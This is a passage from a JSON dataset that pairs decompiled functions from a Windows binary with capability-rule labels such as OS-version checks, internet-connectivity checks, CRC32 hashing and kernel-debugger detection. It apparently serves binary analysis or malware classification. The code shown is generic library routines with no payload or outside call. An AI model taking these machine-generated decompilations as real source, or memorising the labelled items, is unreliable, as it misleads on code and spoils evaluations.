        "decompiled_code": "\nint32_t __cdecl\nfcn.0043a236(uint32_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int16_t iVar9;\n    uint32_t in_ECX;\n    int16_t *piVar10;\n    ulong *puVar11;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = in_ECX;\n    puVar11 = arg_8h + 1;\n    if ((arg_14h == 6) || (arg_14h == 0xc)) {\n        *puVar11 = arg_10h;\n        puVar11 = arg_8h + 2;\n    }\n    iVar3 = *arg_18h;\n    bVar4 = false;\n    arg_14h = arg_18h[2];\n    var_4h = arg_18h[3];\n    uVar2 = *arg_ch;\n    do {\n        if (uVar2 == 0) {\ncode_r0x0043a40d:\n            if (arg_14h < 1) {\n                if (*arg_ch == 0) {\n                    iVar8 = 0;\n                }\n                else {\n                    *arg_1ch = arg_18h[2];\n                    iVar8 = -0x7ffdfff1;\n                }\n            }\n            else {\n                iVar8 = -0x7ffdfff2;\ncode_r0x0043a418:\n                *arg_1ch = arg_14h;\n            }\n            return iVar8;\n        }\n        uVar2 = *arg_ch;\n        arg_8h = in_ECX & 0xffff0000 | uVar2;\n        arg_14h = arg_14h + -1;\n        if ((uVar2 != 0xff) && ((uVar2 & 0x40) != 0)) {\n            arg_8h = uVar2 & 0xffbf | 0x4000;\n        }\n        iVar9 = arg_8h;\n        if (arg_14h < var_4h) {\n            if (iVar9 == 0xff) {\n                arg_14h = arg_18h[3];\n                var_4h = 0;\n                bVar4 = true;\n                goto code_r0x0043a3fd;\n            }\n            if ((!bVar4) && (iVar9 == 0xc)) {\n                *0x450700 = 10;\n                *0x450708 = 0x80020004;\n                piVar10 = 0x450700;\n                goto code_r0x0043a3a0;\n            }\n            goto code_r0x0043a40d;\n        }\n        if (iVar9 == 0xff) goto code_r0x0043a40d;\n        piVar1 = arg_14h * 0x10 + iVar3;\n        piVar10 = piVar1;\n        if ((iVar9 != 0xc) && (iVar9 != *piVar1)) {\n            piVar10 = arg_20h + arg_14h * 0x10;\n            arg_10h = 8;\n            if (iVar9 != 0xe) {\n                arg_10h = arg_8h;\n            }\n            if ((*piVar1 != arg_10h) &&\n               (iVar8 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(piVar10, piVar1, 0, arg_10h),  iVar8 < 0))\n            goto code_r0x0043a418;\n            if (iVar9 == 0xe) {\n                if (*piVar1 == arg_10h) {\n                    uVar6 = fcn.004391f5();\n                    *(piVar10 + 4) = uVar6;\n                    *piVar10 = 8;\n                }\n                else {\n                    uVar6 = *(piVar10 + 4);\n                    uVar5 = fcn.004391f5(uVar6);\n                    *(piVar10 + 4) = uVar5;\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar6);\n                }\n                arg_8h = 0x8;\n            }\n        }\ncode_r0x0043a3a0:\n        if ((arg_8h & 0x4000) != 0) {\ncode_r0x0043a3f5:\n            uVar7 = *(piVar10 + 4);\n            goto code_r0x0043a3f8;\n        }\n    // switch table (20 cases) at 0x43a43f\n        switch(arg_8h & 0xffff) {\n        case 2:\n            uVar7 = piVar10[4];\n            break;\n        case 3:\n        case 4:\n        case 8:\n        case 9:\n        case 10:\n        case 0xd:\n        case 0x13:\n            goto code_r0x0043a3f5;\n        case 5:\n        case 7:\n            *puVar11 = *(piVar10 + 4);\n            goto code_r0x0043a3da;\n        case 6:\n        case 0x14:\n        case 0x15:\n            *puVar11 = *(piVar10 + 4);\n            *(puVar11 + 4) = *(piVar10 + 6);\ncode_r0x0043a3da:\n            puVar11 = puVar11 + 1;\n            goto code_r0x0043a3fd;\n        case 0xb:\n            uVar7 = piVar10[4] != 0;\n            break;\n        case 0xc:\n            *puVar11 = piVar10;\n            goto code_r0x0043a3fa;\n        default:\n            goto code_r0x0043a3fd;\n        case 0x10:\n            uVar7 = *(piVar10 + 4);\n            break;\n        case 0x11:\n            uVar7 = *(piVar10 + 4);\n            break;\n        case 0x12:\n            uVar7 = piVar10[4];\n        }\ncode_r0x0043a3f8:\n        *puVar11 = uVar7;\ncode_r0x0043a3fa:\n        puVar11 = puVar11 + 4;\ncode_r0x0043a3fd:\n        arg_ch = arg_ch + 1;\n        uVar2 = *arg_ch;\n        in_ECX = arg_8h;\n    } while( true );\n}\n",
        "token_count": 1538
    },
    "0043aa33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.0043aa33(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004300c9();\n    *extraout_ECX = vtable.COleDispatchException.0;\n    fcn.004020b0();\n    *(unaff_EBP + -4) = 0;\n    fcn.004020b0();\n    fcn.004020b0();\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 2;\n    extraout_ECX[4] = -(*(unaff_EBP + 0xc) != 0) & *(unaff_EBP + 0xc) + 0x60000U;\n    *(extraout_ECX + 2) = iVar1;\n    if (iVar3 != 0) {\n        fcn.00402d10(*(unaff_EBP + 8));\n    }\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[7] = (-(iVar1 != 0) & 0x7fff0001) + 0x8000ffff;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 426
    },
    "0043aad2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043aad2(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if (param_1[1] != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        *param_1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0043b0e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b0e2(int32_t param_1)\n\n{\n    if (*(param_1 + 0x46) != '\\0') {\n        if (*(param_1 + 0x20) != 0) {\n            (*_sym.imp.ole32.dll_CoRevokeClassObject)(*(param_1 + 0x20));\n            *(param_1 + 0x20) = 0;\n        }\n        *(param_1 + 0x46) = 0;\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0043b12d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b12d(int32_t param_1)\n\n{\n    if (*(param_1 + 0x1c) != 0) {\n        (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(0, 0);\n        *(param_1 + 0x1c) = 0;\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0041014b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041014b(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    ushort unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043381c(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 2;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.0043310a();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 196
    },
    "00410187": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00410187(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043381c(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.0043310a();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 197
    },
    "004101c2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004101c2(int32_t param_1)\n\n{\n    ushort *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043381c(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.00433181((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 2);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "00410205": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00410205(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0043381c(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.00433181((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 191
    },
    "00411bda": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411bda(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x6d) & 0x10) != 0) {\n        if ((*(in_ECX + 0x68) & 1) != (arg_8h != NULL)) {\n            arg_8h = NULL;\n            *(in_ECX + 0x68) = *(in_ECX + 0x68) ^ 1;\n            iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x443dbc, &arg_8h);\n            if (-1 < iVar1) {\n                (**(*arg_8h + 0x14))(arg_8h, 0xfffffd37);\n                (**(*arg_8h + 8))(arg_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00416e57": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.00416e57(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == 0) {\n        return param_1;\n    }\n    iVar1 = *(param_1 + 0x4c);\n    if (iVar1 != 0) {\n        if ((*(iVar1 + 0x6d) & 0x10) != 0) {\n            return (-((*(iVar1 + 0x68) & 1) != 0) & 0xfffffff0) + 0x20;\n        }\n        return 0;\n    }\n    uVar2 = fcn.00416dc9(param_1, 0);\n    return uVar2 & 0x30;\n}\n",
        "token_count": 177
    },
    "0041b910": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b910(uint *arg_8h, uint8_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 1) != 0) {\n            uVar3 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            bVar4 = uVar3 < *arg_ch;\n            if (uVar3 != *arg_ch) goto code_r0x0041b954;\n            arg_ch = arg_ch + 1;\n            if (uVar3 == 0) {\n                return 0;\n            }\n            if ((arg_8h & 2) == 0) goto code_r0x0041b920;\n        }\n        uVar1 = *arg_8h;\n        arg_8h = arg_8h + 2;\n        uVar3 = uVar1;\n        bVar4 = uVar3 < *arg_ch;\n        if (uVar3 != *arg_ch) goto code_r0x0041b954;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar1 >> 8;\n        bVar4 = uVar3 < arg_ch[1];\n        if (uVar3 != arg_ch[1]) goto code_r0x0041b954;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        arg_ch = arg_ch + 2;\n    }\ncode_r0x0041b920:\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar3 = uVar2;\n        bVar4 = uVar3 < *arg_ch;\n        if (uVar3 != *arg_ch) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 8;\n        bVar4 = uVar3 < arg_ch[1];\n        if (uVar3 != arg_ch[1]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x10;\n        bVar4 = uVar3 < arg_ch[2];\n        if (uVar3 != arg_ch[2]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x18;\n        bVar4 = uVar3 < arg_ch[3];\n        if (uVar3 != arg_ch[3]) break;\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 1;\n        if (uVar3 == 0) {\n            return 0;\n        }\n    }\ncode_r0x0041b954:\n    return bVar4 * -2 + 1;\n}\n",
        "token_count": 672
    },
    "004197a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.004197a0(uint32_t *param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    \n    uVar3 = param_3;\n    if (param_3 != 0) {\n        if (((param_1 | param_2) & 3) == 0) {\n            uVar3 = param_3 & 3;\n            param_3 = param_3 >> 2;\n            bVar9 = param_3 == 0;\n            puVar7 = param_1;\n            puVar8 = param_2;\n            if (!bVar9) {\n                do {\n                    param_1 = puVar7;\n                    param_2 = puVar8;\n                    if (param_3 == 0) break;\n                    param_3 = param_3 - 1;\n                    param_2 = puVar8 + 1;\n                    param_1 = puVar7 + 1;\n                    bVar9 = *puVar7 == *puVar8;\n                    puVar7 = param_1;\n                    puVar8 = param_2;\n                } while (bVar9);\n                if (!bVar9) {\n                    uVar3 = param_1[-1];\n                    uVar1 = param_2[-1];\n                    bVar9 = uVar3 < uVar1;\n                    if (((uVar3 == uVar1) &&\n                        (uVar5 = uVar3 >> 8,  uVar6 = uVar1 >> 8,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) &&\n                       (uVar5 = uVar3 >> 0x10,  uVar6 = uVar1 >> 0x10,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) {\n                        bVar9 = uVar3 >> 0x18 < uVar1 >> 0x18;\n                    }\n                    goto code_r0x00419820;\n                }\n            }\n            if (uVar3 != 0) {\n                uVar1 = *param_1;\n                uVar2 = *param_2;\n                bVar9 = uVar1 < uVar2;\n                if (uVar1 != uVar2) {\ncode_r0x00419820:\n                    return (1 - bVar9) - (bVar9 != 0);\n                }\n                uVar4 = uVar3 - 1;\n                if (uVar4 != 0) {\n                    uVar5 = uVar2 >> 8;\n                    uVar6 = uVar1 >> 8;\n                    bVar9 = uVar6 < uVar5;\n                    if (uVar6 != uVar5) goto code_r0x00419820;\n                    uVar4 = uVar3 - 2;\n                    if (uVar4 != 0) {\n                        bVar9 = (uVar1 & 0xff0000) < (uVar2 & 0xff0000);\n                        if ((uVar1 & 0xff0000) != (uVar2 & 0xff0000)) goto code_r0x00419820;\n                        uVar4 = uVar3 - 3;\n                    }\n                }\n                return uVar4;\n            }\n        }\n        else {\n            if ((param_3 & 1) == 0) goto code_r0x004197d3;\n            bVar9 = *param_1 < *param_2;\n            if (*param_1 != *param_2) goto code_r0x00419820;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n            for (param_3 = param_3 - 1; uVar3 = param_3,  param_3 != 0; param_3 = param_3 - 2) {\ncode_r0x004197d3:\n                bVar9 = *param_1 < *param_2;\n                if ((*param_1 != *param_2) ||\n                   (bVar9 = *(param_1 + 1) < *(param_2 + 1),  *(param_1 + 1) != *(param_2 + 1))) goto code_r0x00419820;\n                param_2 = param_2 + 2;\n                param_1 = param_1 + 2;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1042
    },
    "0041b998": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041b998(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_ch;\n    uVar1 = arg_ch[3];\n    arg_8h_00 = arg_ch[4];\n    if (((uVar1 & 0x82) == 0) || ((uVar1 & 0x40) != 0)) {\ncode_r0x0041baa4:\n        arg_ch[3] = uVar1 | 0x20;\n    }\n    else {\n        if ((uVar1 & 1) != 0) {\n            arg_ch[1] = 0;\n            if ((uVar1 & 0x10) == 0) goto code_r0x0041baa4;\n            *arg_ch = arg_ch[2];\n            arg_ch[3] = uVar1 & 0xfffffffe;\n        }\n        uVar1 = arg_ch[3];\n        arg_ch[1] = 0;\n        arg_ch = NULL;\n        piVar2[3] = uVar1 & 0xffffffef | 2;\n        if (((uVar1 & 0x10c) == 0) &&\n           (((piVar2 != 0x44d528 && (piVar2 != 0x44d548)) || (iVar3 = fcn.00421b04(arg_8h_00),  iVar3 == 0)))) {\n            fcn.00421ac0(piVar2);\n        }\n        if ((*(piVar2 + 3) & 0x108) == 0) {\n            iVar3 = 1;\n            arg_ch = fcn.00421a15(arg_8h_00, &arg_8h, 1);\n        }\n        else {\n            iVar4 = piVar2[2];\n            iVar3 = *piVar2;\n            *piVar2 = iVar4 + 1;\n            iVar3 = iVar3 - iVar4;\n            piVar2[1] = piVar2[6] + -1;\n            if (iVar3 < 1) {\n                if (arg_8h_00 == 0xffffffff) {\n                    iVar4 = 0x44daa0;\n                }\n                else {\n                    iVar4 = *((arg_8h_00 >> 5) * 4 + 0x450ea0) + (arg_8h_00 & 0x1f) * 0x24;\n                }\n                if ((*(iVar4 + 4) & 0x20) != 0) {\n                    fcn.0042179c(arg_8h_00, 0, 2);\n                }\n            }\n            else {\n                arg_ch = fcn.00421a15(arg_8h_00, iVar4, iVar3);\n            }\n            *piVar2[2] = arg_8h;\n        }\n        if (arg_ch == iVar3) {\n            return arg_8h & 0xff;\n        }\n        piVar2[3] = piVar2[3] | 0x20;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 730
    },
    "0042179c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042179c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x442a10, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x450e88) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x450ea0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00424e6c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041a92a();\n                *puVar3 = 9;\n                puVar3 = fcn.0041a933();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00421728(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00421823();\n            goto code_r0x00421841;\n        }\n    }\n    puVar3 = fcn.0041a92a();\n    *puVar3 = 9;\n    puVar3 = fcn.0041a933();\n    *puVar3 = 0;\ncode_r0x00421841:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 520
    },
    "00421a15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00421a15(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x442a20, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x450e88) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x450ea0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00424e6c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041a92a();\n                *puVar3 = 9;\n                puVar3 = fcn.0041a933();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00421847(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00421a9c();\n            goto code_r0x00421aba;\n        }\n    }\n    puVar3 = fcn.0041a92a();\n    *puVar3 = 9;\n    puVar3 = fcn.0041a933();\n    *puVar3 = 0;\ncode_r0x00421aba:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 522
    },
    "00422683": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00422683(void)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t unaff_BX;\n    \n    uVar1 = 0;\n    if ((unaff_BX & 1) != 0) {\n        uVar1 = 0x10;\n    }\n    if ((unaff_BX & 4) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((unaff_BX & 8) != 0) {\n        uVar1 = uVar1 | 4;\n    }\n    if ((unaff_BX & 0x10) != 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((unaff_BX & 0x20) != 0) {\n        uVar1 = uVar1 | 1;\n    }\n    if ((unaff_BX & 2) != 0) {\n        uVar1 = uVar1 | 0x80000;\n    }\n    uVar2 = unaff_BX & 0xc00;\n    if ((unaff_BX & 0xc00) != 0) {\n        if (uVar2 == 0x400) {\n            uVar1 = uVar1 | 0x100;\n        }\n        else if (uVar2 == 0x800) {\n            uVar1 = uVar1 | 0x200;\n        }\n        else if (uVar2 == 0xc00) {\n            uVar1 = uVar1 | 0x300;\n        }\n    }\n    if ((unaff_BX & 0x300) == 0) {\n        uVar1 = uVar1 | 0x20000;\n    }\n    else if ((unaff_BX & 0x300) == 0x200) {\n        uVar1 = uVar1 | 0x10000;\n    }\n    if ((unaff_BX & 0x1000) != 0) {\n        uVar1 = uVar1 | 0x40000;\n    }\n    return uVar1;\n}\n",
        "token_count": 472
    },
    "00422cdc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.00422cdc(uint8_t param_1)\n\n{\n    int32_t iStack4;\n    \n    if ((param_1 & 0x20) == 0) {\n        if ((param_1 & 8) != 0) {\n            return 1;\n        }\n        if ((param_1 & 4) == 0) {\n            if ((param_1 & 1) == 0) {\n                return (param_1 & 2) << 1;\n            }\n            iStack4 = 3;\n        }\n        else {\n            iStack4 = 2;\n        }\n    }\n    else {\n        iStack4 = 5;\n    }\n    return iStack4;\n}\n",
        "token_count": 157
    },
    "00424348": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424348(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    uVar1 = fcn.004242f6();\n    iVar2 = (**0x450c00)(uVar1, (-(*0x450bf0 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar2 == 0) {\n        *0x450be0 = 0;\n    }\n    else {\n        iVar2 = fcn.00425f25(*0x450bf4, &var_7ch);\n        if ((iVar2 == 0) && (iVar2 = fcn.004241f5(uVar1),  iVar2 != 0)) {\n            *0x450be0 = *0x450be0 | 4;\n            *0x450be4 = uVar1;\n            *0x450be8 = uVar1;\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 263
    },
    "0042444d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042444d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    arg_8h_00 = fcn.004242f6();\n    iVar1 = (**0x450c00)(arg_8h_00, (-(*0x450bf0 != 0) & 0xfffff005) + 0x1002, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x450be0 = 0;\n        goto code_r0x0042465a;\n    }\n    iVar1 = fcn.00425f25(*0x450bf4, &var_7ch);\n    if (iVar1 == 0) {\n        iVar1 = (**0x450c00)(arg_8h_00, (-(*0x450bec != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00425f25(*0x450bfc, &var_7ch);\n            if (iVar1 == 0) {\n                *0x450be0 = *0x450be0 | 0x304;\n                *0x450be4 = arg_8h_00;\n                *0x450be8 = arg_8h_00;\n            }\n            else if ((*0x450be0 & 2) == 0) {\n                if ((*0x450bf8 == 0) || (iVar1 = fcn.00425f8e(*0x450bfc, &var_7ch, *0x450bf8),  iVar1 != 0)) {\n                    if (((*0x450be0 & 1) == 0) && (iVar1 = fcn.004241f5(arg_8h_00),  iVar1 != 0)) {\n                        *0x450be0 = *0x450be0 | 1;\n                        *0x450be8 = arg_8h_00;\n                    }\n                }\n                else {\n                    *0x450be0 = *0x450be0 | 2;\n                    *0x450be8 = arg_8h_00;\n                    iVar1 = fcn.004196b0(*0x450bfc);\n                    if (iVar1 == *0x450bf8) {\n                        *0x450be4 = arg_8h_00;\n                    }\n                }\n            }\n            goto code_r0x00424578;\n        }\ncode_r0x004245ac:\n        *0x450be0 = 0;\n        goto code_r0x0042465a;\n    }\ncode_r0x00424578:\n    if ((*0x450be0 & 0x300) == 0x300) goto code_r0x0042465a;\n    iVar1 = (**0x450c00)(arg_8h_00, (-(*0x450bec != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) goto code_r0x004245ac;\n    iVar1 = fcn.00425f25(*0x450bfc, &var_7ch);\n    if (iVar1 == 0) {\n        *0x450be0 = *0x450be0 | 0x200;\n        if (((*0x450bec == 0) && (*0x450bf8 != 0)) && (iVar1 = fcn.004196b0(*0x450bfc),  iVar1 == *0x450bf8)) {\n            arg_ch = 1;\n            goto code_r0x0042462a;\n        }\n    }\n    else {\n        if (((*0x450bec != 0) || (*0x450bf8 == 0)) ||\n           (iVar1 = fcn.00425f8e(*0x450bfc, &var_7ch, *0x450bf8),  iVar1 != 0)) goto code_r0x0042465a;\n        arg_ch = 0;\ncode_r0x0042462a:\n        iVar1 = fcn.004243dc(arg_8h_00, arg_ch);\n        if (iVar1 == 0) goto code_r0x0042465a;\n    }\n    *0x450be0 